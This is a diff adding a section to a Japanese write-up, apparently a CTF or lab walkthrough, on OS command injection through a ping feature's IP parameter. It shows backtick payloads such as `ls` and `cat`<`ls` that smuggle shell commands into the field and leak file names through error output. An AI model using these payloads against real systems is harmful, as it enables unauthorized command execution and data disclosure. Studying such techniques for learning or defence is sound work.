@@ -105,3 +105,12 @@ sh -c 'ping -c 1 `ls`' 2>&1 >/dev/null;true
 Error! ping: wow_congrats_you_executed_a_system_command.txt: Name or service not known
 ```
 期待通り、ファイル名取得することができた。
+
+### その他
+前述の通り、他にも使用可能な記号がある。
+
+`ls`では１つのファイル名しか表示されなかったが、`<`を使いほかのコマンドを組み合わせてみる。
+```
+http://example.com/?ip=`cat`<`ls`
+```
+これで同じディレクトリの他のファイル名も取得できる。
